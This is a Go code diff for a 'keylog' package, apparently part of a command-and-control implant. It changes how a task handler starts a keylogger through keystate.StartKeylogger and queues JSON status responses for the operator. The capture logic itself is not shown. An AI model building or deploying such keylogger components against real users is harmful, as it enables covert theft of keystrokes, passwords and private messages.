@@ -1,28 +1,41 @@
 package keylog
 
 import (
+	"encoding/json"
+	"pkg/profiles"
 	"fmt"
 
 	"keylog/keystate"
 	"pkg/utils/structs"
+	"sync"
 )
 
+var mu sync.Mutex
+
 //Run - Function that executes the shell command
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
+func Run(task structs.Task) {
 
-	tMsg := structs.ThreadMsg{}
-	tMsg.Error = false
-	tMsg.TaskItem = task
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
 
-	err := keystate.StartKeylogger(task, threadChannel)
+	err := keystate.StartKeylogger(task)
 
 	if err != nil {
-		tMsg.TaskResult = []byte(err.Error())
-		tMsg.Error = true
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
-    tMsg.Completed = true
-	tMsg.TaskResult = []byte(fmt.Sprintf("Started keylogger."))
-	threadChannel <- tMsg
+	msg.Completed = true
+	msg.UserOutput = fmt.Sprintf("Started keylogger.")
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
